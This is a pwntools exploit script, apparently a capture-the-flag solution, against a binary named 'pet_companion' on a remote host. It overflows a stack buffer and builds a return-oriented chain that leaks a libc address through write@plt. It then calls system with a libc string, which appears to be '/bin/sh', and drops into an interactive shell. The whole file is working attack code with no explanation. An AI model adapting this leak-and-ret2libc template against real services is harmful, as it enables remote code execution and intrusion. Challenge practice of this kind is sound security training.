#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

context.update(arch='amd64')
context.log_level = logging.DEBUG
context.terminal = ['tmux', 'splitw', '-h']
exe = './pet_companion_patched'
libc = ELF('./glibc/libc.so.6')

host = args.HOST or '94.237.62.241'
port = int(args.PORT or 32551)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

gdbscript = '''
b *0x4006d9
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

"""
0x7f7292f100f0
base at 0x7f7292e00000
"""

bin_pop_rdi = 0x0000000000400743
bin_pop_si_pop_r15 = 0x0000000000400741
bin_main = 0x40064a
one_gadget = 0x4f302
write_got = 0x600fd8
write_plt = 0x4004f0

io = start()

p = fit({
    0x48: p64(bin_pop_si_pop_r15),
    0x50: p64(0x600fd8) + p64(0) + p64(bin_pop_rdi) + p64(1) + p64(write_plt) + p64(bin_main),
})

io.sendlineafter(b'status: ', p)

io.recvuntil(b'...\n\n')

libc.address = u64(io.recv(8))-0x1100f0
info(f"libc base: {hex(libc.address)}")

p = fit({
    0x48: p64(bin_pop_rdi) + p64(libc.address + 0x1b3d88) + p64(libc.symbols['__libc_system'])
})

io.sendlineafter('status: ', p)

io.interactive()

